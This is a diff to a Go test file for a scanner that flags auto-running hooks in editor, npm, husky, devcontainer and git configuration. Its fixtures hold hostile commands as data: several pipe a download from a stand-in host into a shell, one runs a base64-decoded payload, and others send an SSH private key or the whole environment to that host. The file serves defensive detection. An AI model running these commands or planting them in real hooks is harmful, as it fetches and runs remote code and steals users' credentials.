@@ -69,13 +69,27 @@ func TestAnalyze(t *testing.T) {
 }]}`, want: []string{"001:3", "012:3"}},
 		{name: "task without command points at the task", path: ".vscode/tasks.json", data: `{"tasks":[
  {"runOptions":{"runOn":"folderOpen"}}]}`, want: []string{"001:2"}},
+		{name: "runOn is compared ignoring case", path: ".vscode/tasks.json", data: `{"tasks":[{"command":"curl https://a.test/x | sh","runOptions":{"runOn":"FolderOpen"}}]}`, want: []string{"001:1", "011:1"}},
+		{name: "runOn that is not a string is ignored", path: ".vscode/tasks.json", data: `{"tasks":[{"command":"curl https://a.test/x | sh","runOptions":{"runOn":["folderOpen"]}}]}`},
+		{name: "duplicate keys: the last command wins", path: ".vscode/tasks.json", data: "{\"tasks\":[{\n\"command\":\"echo hi\",\n\"command\":\"curl https://a.test/x | sh\",\n\"runOptions\":{\"runOn\":\"default\",\"runOn\":\"folderOpen\"}}]}", want: []string{"001:3", "011:3"}},
+		{name: "byte order mark and comments before the root", path: ".vscode/tasks.json", data: "\xef\xbb\xbf// c\n{\"tasks\":[{\n\"command\":\"curl https://a.test/x | sh\",\"runOptions\":{\"runOn\":\"folderOpen\"}}]}", want: []string{"001:3", "011:3"}},
+		{name: "task options shell args are graded", path: ".vscode/tasks.json", data: `{"tasks":[{
+"command":"bash",
+"options":{"shell":{"executable":"bash","args":["-c","curl https://a.test/x | sh"]}},
+"runOptions":{"runOn":"folderOpen"}}]}`, want: []string{"001:2", "011:2"}},
+		{name: "dependsOn tasks are graded, cycles end", path: ".vscode/tasks.json", data: `{"tasks":[
+{"label":"a","command":"echo a","dependsOn":["b","a"],"runOptions":{"runOn":"folderOpen"}},
+{"label":"b","command":"curl https://a.test/x | sh","dependsOn":"a"}]}`, want: []string{"001:2", "011:3"}},
+		{name: "tasks in a code-workspace file", path: "x.code-workspace", data: `{"folders":[],"tasks":{"tasks":[
+{"command":"curl https://a.test/x | sh","runOptions":{"runOn":"folderOpen"}}]}}`, want: []string{"001:2", "011:2"}},
 		{name: "settings tool path into the repo", path: ".vscode/settings.json", data: `{
   // tools
   "eslint.nodePath": "./tools/node",
   "python.defaultInterpreterPath": "${workspaceFolder}/.venv/bin/python",
   "php.validate.executablePath": "/usr/bin/php",
+  "python.pythonPath": ".venv/bin/python",
   "editor.fontSize": 12
-}`, want: []string{"002:3"}},
+}`, want: []string{"002:3", "002:4"}},
 		{name: "settings terminal shell args with a command", path: ".vscode/settings.json", data: `{
   "terminal.integrated.profiles.linux": {"x": {"path": "bash", "args": ["-c", "id"]}},
   "terminal.integrated.shellArgs.windows": ["-NoLogo"]
@@ -99,11 +113,18 @@ func TestAnalyze(t *testing.T) {
     "start": "node index.js"
   }
 }`, want: []string{"005:3", "005:4", "006:5", "011:4"}},
+		{name: "npm preprepare and postprepare", path: "package.json", data: `{"scripts":{
+"preprepare":"node a.js",
+"postprepare":"echo aGk= | base64 -d | sh"}}`, want: []string{"006:2", "006:3", "012:3"}},
+		{name: "husky 4 hooks in package.json", path: "package.json", data: `{"husky":{"hooks":{
+"pre-commit":"curl https://a.test/x | sh","commit-msg":"echo ok"}}}`, want: []string{"006:2", "006:2", "011:2"}},
 		{name: "npm package under node_modules is ignored", path: "node_modules/x/package.json", data: `{"scripts":{"postinstall":"node a.js"}}`},
 		{name: "husky hook runs a download", path: ".husky/pre-commit", data: "#!/usr/bin/env sh\ncurl -fsSL https://a.test/h.sh | sh\n", want: []string{"006:2", "011:2"}},
 		{name: "husky hook with a comment and a continued secret send", path: ".husky/pre-push", data: ". \"$(dirname -- \"$0\")/_/husky.sh\"\n# curl -d $API_TOKEN\ncat ~/.ssh/id_rsa | \\\n  curl -d @- https://a.test\n", want: []string{"006:3", "010:3"}},
 		{name: "husky lint hook", path: ".husky/pre-commit", data: "npx lint-staged\n", want: []string{"006:1"}},
-		{name: "husky internals are ignored", path: ".husky/_/husky.sh", data: "curl x | sh\n"},
+		{name: "husky bulk env dump sent away", path: ".husky/pre-push", data: "env | curl -d @- https://a.test\n", want: []string{"006:1", "010:1"}},
+		{name: "husky helper husky.sh is ignored", path: ".husky/_/husky.sh", data: "curl x | sh\n"},
+		{name: "husky generated files are graded without inventory", path: ".husky/_/h", data: "curl https://a.test/x | sh\n", want: []string{"011:1"}},
 		{name: "pre-commit local hooks with entry and block entry", path: ".pre-commit-config.yaml", data: `repos:
   - repo: https://github.com/pre-commit/pre-commit-hooks
     rev: v5.0.0
@@ -132,6 +153,9 @@ func TestAnalyze(t *testing.T) {
 	clean = git-lfs clean -- %f
 [core "y"]
 `, want: []string{"009:3", "009:4", "009:5", "009:7", "011:3"}},
+		{name: "git config key on the section header line", path: ".git/config", data: "[core] fsmonitor = curl https://a.test/x | sh\n", want: []string{"009:1", "011:1"}},
+		{name: "git lfs filter chained with a download is still reported", path: ".git/config", data: "[filter \"lfs\"]\n\tsmudge = git-lfs smudge -- %f && curl https://a.test/x | sh\n\tprocess = git-lfs filter-process\n\tclean = git-lfs-evil clean\n", want: []string{"009:2", "009:4", "011:2"}},
+		{name: "git config values are graded even for a known tool", path: ".git/config", data: "[core]\n\thooksPath = .husky/_\n\tsshCommand =\n[filter \"x\"]\n\tprocess = git lfs filter-process\n"},
 		{name: "git config benign values", path: ".git/config", data: "[core]\n\tfsmonitor = true\n\thooksPath = .husky/_\n\tsshCommand =\n[filter \"lfs\"]\n\tsmudge = git-lfs smudge -- %f\n[user]\n\tname = x\n"},
 		{name: "setup.py", path: "setup.py", data: "import os\nfrom setuptools import setup\nsetup(name='x')\n", want: []string{"007:3"}},
 		{name: "setup.py without a setup call", path: "setup.py", data: "print(1)\n", want: []string{"007:1"}},
@@ -179,6 +203,34 @@ func TestAnalyzeSkips(t *testing.T) {
 			}
 			if len(out.Skips) != 1 || out.Skips[0].Reason != tt.wantReason || out.Skips[0].Path != tt.path {
 				t.Errorf("skips = %v, want one %s for %s", out.Skips, tt.wantReason, tt.path)
+			}
+		})
+	}
+}
+
+func TestAnalyzeLexicalFallback(t *testing.T) {
+	tests := []struct {
+		name string
+		// inputs
+		path string
+		data string
+		// expectations: the findings, and a parse_error skip
+		want []string
+	}{
+		{name: "tasks file with a missing comma", path: ".vscode/tasks.json", data: "{\"tasks\":[{\n\"command\":\"curl https://a.test/x | sh\"\n\"runOptions\":{\"runOn\":\"FOLDEROPEN\"}}]}", want: []string{"001:3", "011:2"}},
+		{name: "code-workspace with a syntax error", path: "x.code-workspace", data: "{\"tasks\":{\"tasks\":[{\n\"runOptions\":{\"runOn\":\"folderOpen\"} \"command\":\"env | curl -d @- https://a.test\"}]}", want: []string{"001:2", "010:2"}},
+		{name: "devcontainer with a syntax error", path: ".devcontainer/devcontainer.json", data: "{\n\"initializeCommand\":\"curl https://a.test/x | sh\"\n\"postCreateCommand\":\"echo hi\"}", want: []string{"003:2", "004:3", "011:2"}},
+		{name: "tasks file with a syntax error and no trigger", path: ".vscode/tasks.json", data: `{"tasks":[`},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got, out := findings(t, tt.path, tt.data)
+
+			if !slices.Equal(got, tt.want) {
+				t.Errorf("findings = %v, want %v", got, tt.want)
+			}
+			if len(out.Skips) != 1 || out.Skips[0].Reason != "parse_error" {
+				t.Errorf("skips = %v, want one parse_error", out.Skips)
 			}
 		})
 	}
